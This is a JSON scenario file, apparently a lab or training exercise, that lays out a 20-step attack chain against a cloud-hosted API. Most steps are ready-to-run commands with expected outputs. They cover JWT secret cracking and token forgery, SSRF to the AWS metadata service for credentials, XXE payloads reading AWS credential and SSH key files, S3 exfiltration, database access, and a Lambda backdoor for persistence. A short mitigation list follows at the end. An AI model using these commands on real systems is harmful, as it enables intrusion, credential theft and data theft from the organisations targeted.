@@ -1,0 +1,198 @@
+{
+  "title": "JWT Attack Chain to Cloud Infrastructure Compromise",
+  "description": "Sophisticated attack leveraging JWT vulnerabilities, SSRF for AWS metadata access, and XXE for credential extraction leading to full cloud infrastructure takeover",
+  "difficulty": "advanced",
+  "estimated_time": "75 minutes",
+  "tools_used": ["jwt_tool", "hashcat", "curl", "aws-cli", "burp", "sqlmap"],
+  "attack_chain": [
+    {
+      "step": 1,
+      "title": "JWT Token Capture",
+      "command": "curl -X POST http://api.target.com/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"testuser\",\"password\":\"TestPass123\"}' -v | grep Authorization",
+      "explanation": "Authenticate as regular user and capture JWT token from response headers",
+      "expected_output": "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6InRlc3R1c2VyIiwiaXNfYWRtaW4iOmZhbHNlLCJpYXQiOjE3MDUzNDI4MDB9.Abc123...",
+      "success_criteria": "JWT token successfully obtained"
+    },
+    {
+      "step": 2,
+      "title": "JWT Structure Analysis",
+      "command": "jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6InRlc3R1c2VyIiwiaXNfYWRtaW4iOmZhbHNlLCJpYXQiOjE3MDUzNDI4MDB9.Abc123 -T",
+      "explanation": "Decode and analyze JWT structure to identify claims and algorithm used",
+      "expected_output": "Algorithm: HS256, Payload: {user_id:2, username:'testuser', is_admin:false, iat:1705342800}",
+      "success_criteria": "JWT decoded, HS256 algorithm identified, is_admin:false claim found"
+    },
+    {
+      "step": 3,
+      "title": "JWT Secret Cracking",
+      "command": "jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6InRlc3R1c2VyIiwiaXNfYWRtaW4iOmZhbHNlLCJpYXQiOjE3MDUzNDI4MDB9.Abc123 -C -d /usr/share/wordlists/rockyou.txt",
+      "explanation": "Brute-force JWT HMAC secret using rockyou wordlist to enable token forgery",
+      "expected_output": "SECRET CRACKED: 'supersecret123' in 2.7 seconds (12,847 attempts)",
+      "success_criteria": "HS256 secret successfully cracked"
+    },
+    {
+      "step": 4,
+      "title": "JWT Privilege Escalation",
+      "command": "jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6InRlc3R1c2VyIiwiaXNfYWRtaW4iOmZhbHNlLCJpYXQiOjE3MDUzNDI4MDB9.Abc123 -I -pc is_admin -pv true -pc user_id -pv 1 -S hs256 -p supersecret123",
+      "explanation": "Forge new JWT with is_admin:true and user_id:1 using cracked secret",
+      "expected_output": "Forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InRlc3R1c2VyIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTcwNTM0MjgwMH0.NEW_VALID_SIGNATURE",
+      "success_criteria": "Admin-level JWT successfully forged"
+    },
+    {
+      "step": 5,
+      "title": "Admin API Access Verification",
+      "command": "curl http://api.target.com/admin/users -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6InRlc3R1c2VyIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTcwNTM0MjgwMH0.NEW_SIGNATURE'",
+      "explanation": "Test forged JWT against admin endpoint to confirm privilege escalation",
+      "expected_output": "200 OK: {users:[{id:1,username:'admin',email:'admin@target.com',role:'superadmin'},...]} - 47 users returned",
+      "success_criteria": "Admin endpoints accessible with forged token"
+    },
+    {
+      "step": 6,
+      "title": "SSRF Endpoint Discovery",
+      "command": "curl -H 'Authorization: Bearer FORGED_JWT' http://api.target.com/admin/features | grep -i 'url\\|fetch\\|proxy\\|request'",
+      "explanation": "Enumerate admin API endpoints looking for SSRF vulnerabilities in URL fetch features",
+      "expected_output": "Found: /admin/fetch-content (url parameter), /admin/webhook-test (callback_url), /admin/import-data (source_url)",
+      "success_criteria": "SSRF-capable endpoints identified"
+    },
+    {
+      "step": 7,
+      "title": "AWS Metadata Service Exploitation",
+      "command": "curl -H 'Authorization: Bearer FORGED_JWT' -X POST http://api.target.com/admin/fetch-content -H 'Content-Type: application/json' -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}'",
+      "explanation": "Abuse SSRF to access AWS EC2 instance metadata service and list IAM roles",
+      "expected_output": "IAM roles: ['ec2-web-server-role', 'admin-access-role', 's3-backup-role']",
+      "success_criteria": "AWS IAM roles enumerated"
+    },
+    {
+      "step": 8,
+      "title": "AWS Credential Extraction",
+      "command": "curl -H 'Authorization: Bearer FORGED_JWT' -X POST http://api.target.com/admin/fetch-content -H 'Content-Type: application/json' -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-access-role\"}'",
+      "explanation": "Extract temporary AWS credentials from metadata service for admin IAM role",
+      "expected_output": "AccessKeyId: ASIAQWERTYUIOP, SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCY, Token: AQoDYXdzEJr...(6hr expiry)",
+      "success_criteria": "Full AWS credentials obtained"
+    },
+    {
+      "step": 9,
+      "title": "AWS Environment Configuration",
+      "command": "export AWS_ACCESS_KEY_ID=ASIAQWERTYUIOP && export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCY && export AWS_SESSION_TOKEN=AQoDYXdzEJr... && aws sts get-caller-identity",
+      "explanation": "Configure AWS CLI with stolen credentials and verify access level",
+      "expected_output": "UserId: AIDAI23ABC456DEF789, Account: 123456789012, Arn: arn:aws:sts::123456789012:assumed-role/admin-access-role/i-0abc123def456",
+      "success_criteria": "AWS credentials validated, admin role confirmed"
+    },
+    {
+      "step": 10,
+      "title": "S3 Bucket Enumeration",
+      "command": "aws s3 ls",
+      "explanation": "List all S3 buckets accessible with compromised credentials",
+      "expected_output": "Buckets: production-data, customer-backups, application-logs, sensitive-documents, database-dumps",
+      "success_criteria": "Sensitive S3 buckets discovered"
+    },
+    {
+      "step": 11,
+      "title": "Sensitive Data Exfiltration",
+      "command": "aws s3 sync s3://customer-backups ./exfiltrated-data/ && aws s3 sync s3://database-dumps ./exfiltrated-data/db/",
+      "explanation": "Download all sensitive data from S3 buckets including customer backups and database dumps",
+      "expected_output": "Downloaded: 2,847 files (8.4GB) from customer-backups, 15 SQL dumps (1.2GB) from database-dumps",
+      "success_criteria": "Sensitive data successfully exfiltrated"
+    },
+    {
+      "step": 12,
+      "title": "XXE Vulnerability Discovery",
+      "command": "curl -H 'Authorization: Bearer FORGED_JWT' -X POST http://api.target.com/admin/import-config -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY test \"XXE_TEST\">]><config><setting>&test;</setting></config>'",
+      "explanation": "Test XML import endpoint for XXE vulnerability by attempting entity expansion",
+      "expected_output": "Config imported: setting=XXE_TEST - Entity expansion confirmed, XXE vulnerable",
+      "success_criteria": "XXE vulnerability confirmed"
+    },
+    {
+      "step": 13,
+      "title": "Local File Read via XXE",
+      "command": "curl -H 'Authorization: Bearer FORGED_JWT' -X POST http://api.target.com/admin/import-config -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///home/ubuntu/.aws/credentials\">]><config><setting>&xxe;</setting></config>'",
+      "explanation": "Exploit XXE to read AWS credentials file from server filesystem",
+      "expected_output": "AWS credentials: [default] aws_access_key_id=AKIAIOSFODNN7EXAMPLE (permanent keys, not temporary!)",
+      "success_criteria": "Permanent AWS credentials extracted via XXE"
+    },
+    {
+      "step": 14,
+      "title": "SSH Private Key Extraction",
+      "command": "curl -H 'Authorization: Bearer FORGED_JWT' -X POST http://api.target.com/admin/import-config -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///home/ubuntu/.ssh/id_rsa\">]><config><key>&xxe;</key></config>'",
+      "explanation": "Use XXE to extract SSH private key for direct server access",
+      "expected_output": "SSH key extracted: -----BEGIN RSA PRIVATE KEY----- ... -----END RSA PRIVATE KEY-----",
+      "success_criteria": "SSH private key obtained"
+    },
+    {
+      "step": 15,
+      "title": "Direct Server SSH Access",
+      "command": "echo '-----BEGIN RSA PRIVATE KEY-----\\n...\\n-----END RSA PRIVATE KEY-----' > stolen_key.pem && chmod 600 stolen_key.pem && ssh -i stolen_key.pem ubuntu@api.target.com",
+      "explanation": "Use stolen SSH key to gain direct shell access to EC2 instance",
+      "expected_output": "SSH connection successful: ubuntu@ip-10-0-1-50:~$ - Direct shell access to production server",
+      "success_criteria": "Interactive SSH session established"
+    },
+    {
+      "step": 16,
+      "title": "EC2 Instance Privilege Escalation",
+      "command": "sudo -l",
+      "explanation": "Check sudo permissions for privilege escalation to root on EC2 instance",
+      "expected_output": "User ubuntu may run ALL commands with NOPASSWD - full sudo access without password",
+      "success_criteria": "Root access possible: sudo su -"
+    },
+    {
+      "step": 17,
+      "title": "AWS Infrastructure Reconnaissance",
+      "command": "aws ec2 describe-instances --region us-east-1 && aws rds describe-db-instances --region us-east-1 && aws lambda list-functions --region us-east-1",
+      "explanation": "Enumerate complete AWS infrastructure including EC2, RDS databases, and Lambda functions",
+      "expected_output": "15 EC2 instances, 3 RDS databases (production-db, analytics-db, backup-db), 28 Lambda functions discovered",
+      "success_criteria": "Full AWS infrastructure mapped"
+    },
+    {
+      "step": 18,
+      "title": "RDS Database Credential Extraction",
+      "command": "aws rds describe-db-instances --db-instance-identifier production-db | grep MasterUsername && sudo cat /var/www/api/config/database.yml",
+      "explanation": "Extract RDS master credentials from instance metadata and application config",
+      "expected_output": "Master user: dbadmin, Password: ProdDB#2024!Secure (from config file)",
+      "success_criteria": "RDS credentials obtained"
+    },
+    {
+      "step": 19,
+      "title": "Production Database Access",
+      "command": "mysql -h production-db.abc123.us-east-1.rds.amazonaws.com -u dbadmin -pProdDB#2024!Secure -e 'SHOW DATABASES; SELECT COUNT(*) FROM production.users; SELECT COUNT(*) FROM production.orders;'",
+      "explanation": "Connect to production RDS database and enumerate sensitive data volume",
+      "expected_output": "Databases: production, analytics, logs. Users: 147,523, Orders: 892,104, Revenue data accessible",
+      "success_criteria": "Full production database access achieved"
+    },
+    {
+      "step": 20,
+      "title": "Complete Infrastructure Backdoor",
+      "command": "aws iam create-access-key --user-name admin && aws lambda create-function --function-name persistence-beacon --runtime python3.9 --role arn:aws:iam::123456789012:role/lambda-admin --handler lambda_function.lambda_handler --zip-file fileb://beacon.zip",
+      "explanation": "Create persistent IAM access keys and deploy Lambda backdoor for long-term access",
+      "expected_output": "AccessKey created: AKIAI234NEW567ACCESS89, Lambda backdoor deployed: executes every 6 hours",
+      "success_criteria": "Persistent access mechanisms established across AWS infrastructure"
+    }
+  ],
+  "learning_objectives": [
+    "JWT security weaknesses and token forgery techniques",
+    "Exploiting SSRF vulnerabilities for cloud metadata service access",
+    "AWS EC2 instance metadata service (IMDSv1) exploitation",
+    "Extracting and using temporary vs permanent AWS credentials",
+    "XXE attacks for local file inclusion and credential theft",
+    "Lateral movement from web application to cloud infrastructure",
+    "AWS service enumeration and reconnaissance",
+    "RDS database access and credential extraction",
+    "Establishing persistent access in cloud environments",
+    "Multi-stage attack chains combining web and cloud vulnerabilities"
+  ],
+  "mitigation": [
+    "Use strong, randomly generated secrets for JWT signing (minimum 256-bit)",
+    "Consider asymmetric algorithms (RS256) instead of HS256 for JWT",
+    "Implement JWT expiration and refresh token rotation",
+    "Validate and whitelist URLs in any server-side request functionality",
+    "Upgrade to IMDSv2 (requires session token) to prevent SSRF-based metadata access",
+    "Disable XML external entity processing in all XML parsers",
+    "Use minimal IAM permissions (principle of least privilege)",
+    "Rotate AWS credentials regularly and use temporary credentials where possible",
+    "Enable AWS CloudTrail and GuardDuty for anomaly detection",
+    "Implement MFA for all privileged AWS accounts",
+    "Use AWS Secrets Manager instead of storing credentials in config files",
+    "Enable RDS encryption at rest and in transit",
+    "Implement VPC security groups to restrict database access to specific IPs",
+    "Monitor for unusual API calls and data exfiltration patterns"
+  ],
+  "tags": ["jwt", "authentication_bypass", "ssrf", "xxe", "aws", "cloud_security", "privilege_escalation", "persistence"]
+}
